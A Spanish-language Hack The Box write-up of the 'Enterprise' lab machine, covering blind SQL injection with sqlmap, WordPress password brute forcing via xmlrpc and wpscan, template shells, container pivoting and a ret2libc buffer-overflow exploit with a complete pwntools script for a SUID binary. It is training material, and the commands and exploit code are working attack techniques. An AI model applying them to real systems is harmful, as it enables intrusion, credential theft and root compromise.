---
layout: single
title: HTB-Enterprise
excerpt: "WriteUp con metodología de la máquina Enterprise."
date: 2021-12-15
classes: wide
header:
  icon: /assets/images/hackthebox.webp
  teaser_home_page: true
  teaser: /assets/images/WriteUps/Enterprise.png
categories:
  - WriteUps
tags:
  - HTB

---


<center><img src='/assets/images/WriteUps/Enterprise.png'></center>

IP -> 10.10.10.61


# Reconocimiento
## Nmap
Utilizamos [nmap](/Nmap/) y obtenemos los siguientes resultados.
[Enterprise Nmap Result](/assets/files/WriteUps/Enterprise.txt)

## whatweb
Con la herramienta [whatweb](/whatweb/) comprobamos si nos detecta un CMS.
> 80 -> Wordpress
> 443 -> (N/A)
> 8080 -> Joomla

## https
Con **openssl** comprobamos el certificado para obtener dominios y correos. Añadimos el host al /etc/hosts

> Host: enterprise.local

## 32812
Con **netcat** nos conectamos al servicio a ver que podemos hacer. Nos pide un access code.

## http
Al acceder a la página, no cargan bien las cosas, en el código vemos que toma los vínculos de "enterprise.htb". Añadimos el dominio.

> Host: enterprise.htb

### Wordpress

En los posts, vemos usuarios. En el panel de autenticación **wp-login.php** validamos los usuarios.

> Users: william.riker


## https
Vemos un servicio con pocos recursos, vamos a utilizar tanto [nmap](/Nmap/), [wfuzz](/wfuzz/) o [gobuster](/gobuster/).

> /files

Encontramos un archivo comprimido.

> lcars.zip

Al descomprimirlo vemos 3 archivos con extensión php.

> lcars.php -> Comentado, similar a un plugin de wordpress.
> lcars_db.php -> Recibe por el parámetro query, algo para realizar sentencias SQL.
 
Suponemos que es un plugin.

Encontramos manualmente la ruta: /wp-content/plguins/lcars/

Probamos inyecciones SQL en el archivo **lcars_db.php**. Como en sí es una sentencia, no tenemos que utilizar '.
Como no reporta nada por consola, se trata de una inyección Blind-SQL.


# Exploitation
## SQLMap
Como es mucho lo que tenemos que dumpear y es basado en tiempo, utilizamos [sqlmap](/sqlmap/). 
Enumeramos la base de datos **wordpress**, tabla **wp_users**.

> USER: william.riker\@enterprise.htb
> PASS: HashedPass (can't crack it)


Enumeramos la base de datos **wordpress**, tabla **wp_posts**.

> post_content -> nos reporta un post, tenemos que sanitizarlo 

```bash
cat file.csv | sed 's/\\n/\n/g' | sed '/^\s*$/d' | sed 's/\\r/\r/g'
```

Vemos que tenemos un listado de 4 credenciales.

## Wordpress
Bruteforce de contraseñas
### xmlrpc.php
Validamos credenciales en la API, en xmlrpc.php. Buscamos en google para bruteforcearlo.

```xml
<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
	<methodName>wp.getUsersBlogs</methodName>
	<params>
		<param><value>administrator</value></param>
		<param><value>admin</value></param>
	</params>
</methodCall>
```

Mediante esta estructura, validamos contraseñas para el usuario. 

### wp-scan
```bash
wpscan --url "http://enterprise.htb" -U 'william.riker' -P credentials.txt
```

Encontramos una contraseña válida.

### wp-login
Utilizamos la clásica para entrar por [Wordpress](/Wordpress/) con el 404.php.

# Container Escape
## 172.17.0.4
### OS
```bash
hostname -I
cat wp-config.php
```

> IP: 172.17.0.4
> Credenciales válidas.

### SQLMap
Mediante la inyección anterior enumeramos la base de datos **joomladb** (la **joomla** está vacía) tabla **\*\_users**, username and password.

> +2 Usuarios
> +2 Hashes (Probamos a romperlas con los diccionarios de contraseñas que tenemos del anterior dumpeo)
> +2 Passwords

Iniciamos sesión en el [joomla](/joomla/) y explotamos la plantilla.

## 172.17.0.3
### OS
```bash
hostname -I
cd /var/www/html
ls
cd files
ls
mount -l
```

> IP: 172.17.0.3
> En el directorio **files** encontramos el **lcars.zip**, que es el 3er servicio http que estaba corriendo. Creamos un archivo php, para conseguir otra reverse shell.
> Con el mount podemos intuir que esa carpeta realmente esté en otra máquina/contenedor.

> user.txt
# PrivEsc
## OS
```bash
cd /
find \-perm -4000 2>/dev/null
```

> /bin/lcars -> Binario con SUID, tenemos acceso al binario que siempre se ejecuta por root y está expuesto.

Traemos el binario a nuestra máquina para analizarlo.

```bash
ltrace ./lcars
```

Al introducirle un valor, vemos que lo compara con la string "picarda1".
Volvemos a iniciarlo con la contraseña obtenida. Probamos con el "Security", nos pide un código, probamos a provocar un BufferOverflow. Tenemos segmentation fault.

## BufferOverflow

```bash
gdb ./lcars
r
picarda1
4
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
pattern create 500
r
picarda1
4
$(pattern create 500)
pattern offset $eip
file lcars
checksec
```

> eip -> "daac"
> offtet (little endian) -> 212
> No tiene DEP activado pero tiene PIE, por lo que recibe aleatorización en la pila. Comprobamos si el ASLR está activado.

```bash
ldd /bin/lcars | grep libc | awk 'NF{print $NF}' | tr -d '()'
ldd /bin/lcars | grep libc | awk 'NF{print $NF}' | tr -d '()'
ldd /bin/lcars | grep libc | awk 'NF{print $NF}' | tr -d '()'

cat /proc/sys/kernel/randomize_va_space
```

> ASLR desactivado.

### Ret2libc
Ret2libc -> system_addr -> exit_addr -> bin_sh

```bash
gdb /bin/lcars
r
picarda1
4
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
p system
p exit
find &system,+9999999,"sh"
```

> system_addr
> exit_addr
> 3x sh_addr

```python
#!/usr/bin/python3

from pwn import *

def def_handler(sig, frame):
	print("\n\n[!] Saliendo...\n")
	sys.exit(1)
	
# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

def bufferOverflow():
	
	offset = 212
	junk = b"A"*offset
	
	system_addr = p32(0xf7e4c060)
	exit_addr = p32(0xf7e3faf0)
	sh_addr = p32(0xf7f6ddd5)
	
	payload = junk + system_addr + exit_addr + sh_addr
	
	context(os='Linux', arch='i386')
	host, port = "10.10.10.61", 32812
	
	r = remote(host, port)
	r.recvuntil("Enter Bridge Access Code:")
	r.sendline("picarda1")
	r.recvuntil("Waiting for input:")
	r.sendline("4")
	r.recvuntil("Enter Security Override:")
	r.sendline(payload)
	
	r.interactive()
	

if __name__ == '__main__':
	
	bufferOverflow()
	
```

> root.txt
